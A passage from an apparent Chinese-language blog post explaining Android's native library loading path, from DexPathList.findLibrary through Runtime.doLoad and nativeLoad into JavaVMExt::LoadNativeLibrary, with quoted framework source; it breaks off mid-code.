class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A pair of lists of entries, associated with a &#123;<span class="doctag">@code</span> ClassLoader&#125;.</span></span><br><span class="line"><span class="comment"> * One of the lists is a dex/resource path &amp;mdash; typically referred</span></span><br><span class="line"><span class="comment"> * to as a "class path" &amp;mdash; list, and the other names directories</span></span><br><span class="line"><span class="comment"> * containing native code libraries. Class path entries may be any of:</span></span><br><span class="line"><span class="comment"> * a &#123;<span class="doctag">@code</span> .jar&#125; or &#123;<span class="doctag">@code</span> .zip&#125; file containing an optional</span></span><br><span class="line"><span class="comment"> * top-level &#123;<span class="doctag">@code</span> classes.dex&#125; file as well as arbitrary resources,</span></span><br><span class="line"><span class="comment"> * or a plain &#123;<span class="doctag">@code</span> .dex&#125; file (with no possibility of associated</span></span><br><span class="line"><span class="comment"> * resources).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;This class also contains methods to use these lists to look up</span></span><br><span class="line"><span class="comment"> * classes and resources.&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*package*/</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">DexPathList</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEX_SUFFIX = <span class="string">".dex"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String zipSeparator = <span class="string">"!/"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** class definition context */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader definingContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * List of dex/resource (class path) elements.</span></span><br><span class="line"><span class="comment">     * Should be called pathElements, but the Facebook app uses reflection</span></span><br><span class="line"><span class="comment">     * to modify 'dexElements' (http://b/7726934).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Element[] dexElements;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of native library path elements. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Element[] nativeLibraryPathElements;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of application native library directories. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; nativeLibraryDirectories;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** List of system native library directories. */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;File&gt; systemNativeLibraryDirectories;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Exceptions thrown during creation of the dexElements list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> IOException[] dexElementsSuppressedExceptions;</span><br><span class="line"></span><br><span class="line">    ........</span><br><span class="line">    ........</span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Element of the dex/resource file path</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">/*package*/</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> File dir;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> isDirectory;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> File zip;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> DexFile dexFile;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> ZipFile zipFile;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">boolean</span> initialized;</span><br><span class="line">      ....</span><br><span class="line">     ....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以说，如果我们要查找一个so的路径，就需要从dexPathList中查阅。</p><p>它的查找逻辑为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Finds the named native code library on any of the library</span></span><br><span class="line"><span class="comment"> * directories pointed at by this instance. This will find the</span></span><br><span class="line"><span class="comment"> * one in the earliest listed directory, ignoring any that are not</span></span><br><span class="line"><span class="comment"> * readable regular files.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the complete path to the library or &#123;<span class="doctag">@code</span> null&#125; if no</span></span><br><span class="line"><span class="comment"> * library was found</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">findLibrary</span><span class="params">(String libraryName)</span> </span>&#123;</span><br><span class="line">    String fileName = System.mapLibraryName(libraryName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Element element : nativeLibraryPathElements) &#123;</span><br><span class="line">        String path = element.findNativeLibrary(fileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> path;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1、首先，拼接so的全称，也就是上面的System.mapLibraryName</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Returns the platform specific file name format for the shared library</span></span><br><span class="line"><span class="comment"> * named by the argument. On Android, this would turn &#123;<span class="doctag">@code</span> "MyLibrary"&#125; into</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> "libMyLibrary.so"&#125;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">mapLibraryName</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nickname == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException(<span class="string">"nickname == null"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"lib"</span> + nickname + <span class="string">".so"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2、然后在本地的库路径中查找目标so，如果命中，则返回全路径</strong>。</p><p>这里的nativeLibraryPathElements是在构造函数中初始化的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">DexPathList</span><span class="params">(ClassLoader definingContext, String dexPath,</span></span></span><br><span class="line"><span class="function"><span class="params">          String libraryPath, File optimizedDirectory)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">   ....</span><br><span class="line">     ....</span><br><span class="line">      <span class="comment">// Native libraries may exist in both the system and</span></span><br><span class="line">      <span class="comment">// application library paths, and we use this search order:</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">//   1. This class loader's library path for application libraries (libraryPath):</span></span><br><span class="line">      <span class="comment">//   1.1. Native library directories</span></span><br><span class="line">      <span class="comment">//   1.2. Path to libraries in apk-files</span></span><br><span class="line">      <span class="comment">//   2. The VM's library path from the system property for system libraries</span></span><br><span class="line">      <span class="comment">//      also known as java.library.path</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// This order was reversed prior to Gingerbread; see http://b/2933456.</span></span><br><span class="line">       </span><br><span class="line">      <span class="comment">// 两个路径，一个是当前应用的库路径，一个是系统的库路径。</span></span><br><span class="line">      <span class="comment">// add的方式加入list中，当前应用的库路径position先于系统的</span></span><br><span class="line">      <span class="keyword">this</span>.nativeLibraryDirectories = splitPaths(libraryPath, <span class="keyword">false</span>);</span><br><span class="line">      <span class="keyword">this</span>.systemNativeLibraryDirectories =</span><br><span class="line">              splitPaths(System.getProperty(<span class="string">"java.library.path"</span>), <span class="keyword">true</span>);</span><br><span class="line">      List&lt;File&gt; allNativeLibraryDirectories = <span class="keyword">new</span> ArrayList&lt;&gt;(nativeLibraryDirectories);</span><br><span class="line">      allNativeLibraryDirectories.addAll(systemNativeLibraryDirectories);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">this</span>.nativeLibraryPathElements = makePathElements(allNativeLibraryDirectories, <span class="keyword">null</span>,</span><br><span class="line">                                                        suppressedExceptions);</span><br><span class="line">......</span><br><span class="line">        .....</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>对于so来说，它可能存在于系统的库路径下，亦可能存在于当前应用的库路径下。</p><p>所以对于so的搜索查找来说，它的顺序为：</p><ul><li>现在当前应用的库路径下查找</li><li>如果没有，再到系统的库路径下查找</li></ul><p>在我们拼装完当前so的全称后，就会遍历nativeLibraryPathElements这个List，它里面包含的也就是应用的库路径和系统的库路径（应用的库路径position在系统的库路径前面）。</p><p>接下来，就返回到了RunTime.getRunTime().loadLibrary()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">String filename = loader.findLibrary(libraryName);</span><br><span class="line"><span class="keyword">if</span> (filename == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// It's not necessarily true that the ClassLoader used</span></span><br><span class="line">    <span class="comment">// System.mapLibraryName, but the default setup does, and it's</span></span><br><span class="line">    <span class="comment">// misleading to say we didn't find "libMyLibrary.so" when we</span></span><br><span class="line">    <span class="comment">// actually searched for "liblibMyLibrary.so.so".</span></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(loader + <span class="string">" couldn't find \""</span> +</span><br><span class="line">                                   System.mapLibraryName(libraryName) + <span class="string">"\""</span>);</span><br><span class="line">&#125;</span><br><span class="line">String error = doLoad(filename, loader);</span><br><span class="line"><span class="keyword">if</span> (error != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> UnsatisfiedLinkError(error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p>这里的filename也就是查找库后的全路径。</p><p>接着就会调用doLoad将这个so加载到内存当中。</p><h2 id="LD-LIBRARY-PATH"><a href="#LD-LIBRARY-PATH" class="headerlink" title="LD_LIBRARY_PATH"></a>LD_LIBRARY_PATH</h2><p>进行下一步分析之前，需要了解一下LD_LIBRARY_PATH。</p><p>这个字段是Linux的环境变量名，主要用于指定查找共享库（动态链接库）时除了默认路径之外的其他路径。</p><p>因为Android的应用进程都fork自zygote，这也就意味着所有的应用进程都不能拥有自定义的LD_LIBRARY_PATH。也就是说一个APP的共享库路径不在LD_LIBRARY_PATH上。</p><p>对于PathClassloader来说，它本来就是用于查找本地文件系统下的资源和dex，所以它能获取目标库而不需要任何依赖。但对于一个拥有多个相互依赖的库的APP来说，load就必须遵从most-dependent-first的顺序。</p><p>所以Android的动态链接器增加了一套API，用于更新当前运行的进程的库路径。它会获取当前ClassLoader加载的库路径，在调用nativeLoad时将这个路径传入。</p><h2 id="doLoad"><a href="#doLoad" class="headerlink" title="doLoad"></a>doLoad</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">doLoad</span><span class="params">(String name, ClassLoader loader)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH,</span></span><br><span class="line">    <span class="comment">// which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load</span></span><br><span class="line">    <span class="comment">// libraries with no dependencies just fine, but an app that has multiple libraries that</span></span><br><span class="line">    <span class="comment">// depend on each other needed to load them in most-dependent-first order.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We added API to Android's dynamic linker so we can update the library path used for</span></span><br><span class="line">    <span class="comment">// the currently-running process. We pull the desired path out of the ClassLoader here</span></span><br><span class="line">    <span class="comment">// and pass it to nativeLoad so that it can call the private dynamic linker API.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the</span></span><br><span class="line">    <span class="comment">// beginning because multiple apks can run in the same process and third party code can</span></span><br><span class="line">    <span class="comment">// use its own BaseDexClassLoader.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any</span></span><br><span class="line">    <span class="comment">// dlopen(3) calls made from a .so's JNI_OnLoad to work too.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// So, find out what the native library search path is for the ClassLoader in question...</span></span><br><span class="line">    String ldLibraryPath = <span class="keyword">null</span>;</span><br><span class="line">    String dexPath = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (loader == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// We use the given library path for the boot class loader. This is the path</span></span><br><span class="line">        <span class="comment">// also used in loadLibraryName if loader is null.</span></span><br><span class="line">        ldLibraryPath = System.getProperty(<span class="string">"java.library.path"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (loader <span class="keyword">instanceof</span> BaseDexClassLoader) &#123;</span><br><span class="line">        BaseDexClassLoader dexClassLoader = (BaseDexClassLoader) loader;</span><br><span class="line">        ldLibraryPath = dexClassLoader.getLdLibraryPath();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless</span></span><br><span class="line">    <span class="comment">// of how many ClassLoaders are in the system, but dalvik doesn't support synchronized</span></span><br><span class="line">    <span class="comment">// internal natives.</span></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> nativeLoad(name, loader, ldLibraryPath);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以看到，如果classloader为空，ldLibraryPath就指定为本地文件库的路径。</p><p><strong>在BaseDexClassLoader中，获取ldLibraryPath的方法为：</strong></p><p>遍历pathList，拿到当前应用下的库路径（不是系统的）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@hide</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getLdLibraryPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    StringBuilder result = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (File directory : pathList.getNativeLibraryDirectories()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (result.length() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            result.append(<span class="string">':'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        result.append(directory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="nativeLoad"><a href="#nativeLoad" class="headerlink" title="nativeLoad"></a>nativeLoad</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> jstring <span class="title">Runtime_nativeLoad</span><span class="params">(JNIEnv* env, jclass, jstring javaFilename, jobject javaLoader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  jstring javaLdLibraryPathJstr)</span> </span>&#123;</span><br><span class="line">  <span class="function">ScopedUtfChars <span class="title">filename</span><span class="params">(env, javaFilename)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (filename.c_str() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  SetLdLibraryPath(env, javaLdLibraryPathJstr);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span> error_msg;</span><br><span class="line">  &#123;</span><br><span class="line">    JavaVMExt* vm = Runtime::Current()-&gt;GetJavaVM();</span><br><span class="line">    <span class="keyword">bool</span> success = vm-&gt;LoadNativeLibrary(env, filename.c_str(), javaLoader, &amp;error_msg);</span><br><span class="line">    <span class="keyword">if</span> (success) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Don't let a pending exception from JNI_OnLoad cause a CheckJNI issue with NewStringUTF.</span></span><br><span class="line">  env-&gt;ExceptionClear();</span><br><span class="line">  <span class="keyword">return</span> env-&gt;NewStringUTF(error_msg.c_str());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ScopedUtfChars</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  ScopedUtfChars(JNIEnv* env, jstring s) : env_(env), string_(s) &#123;</span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      utf_chars_ = <span class="literal">NULL</span>;</span><br><span class="line">      jniThrowNullPointerException(env, <span class="literal">NULL</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      utf_chars_ = env-&gt;GetStringUTFChars(s, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ~ScopedUtfChars() &#123;</span><br><span class="line">    <span class="keyword">if</span> (utf_chars_) &#123;</span><br><span class="line">      env_-&gt;ReleaseStringUTFChars(string_, utf_chars_);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">c_str</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> utf_chars_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">size_t</span> size() <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(utf_chars_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>&amp; <span class="keyword">operator</span>[](<span class="keyword">size_t</span> n) <span class="keyword">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> utf_chars_[n];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  JNIEnv* <span class="keyword">const</span> env_;</span><br><span class="line">  <span class="keyword">const</span> jstring string_;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* utf_chars_;</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(ScopedUtfChars);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里主要做的内容为将上方传入的libtest.so转为jni下的String类型，设置LdLibraryPath，拿到VM对象，告诉虚拟机加载目标库文件LoadNativeLibrary。</p><p><strong>虚拟机加载库的逻辑为：</strong></p><ul><li>判断是否已经加载过该so，如果已经加载，直接返回</li><li>如果没有，则使用dlopen打开目标库。只要目标库的引用计数不为0，那么就不会调用dlclose</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> JavaVMExt::LoadNativeLibrary(JNIEnv* env, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; path, jobject class_loader,</span><br><span class="line">                                  <span class="built_in">std</span>::<span class="built_in">string</span>* error_msg) &#123;</span><br><span class="line">  error_msg-&gt;clear();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// See if we've already loaded this library.  If we have, and the class 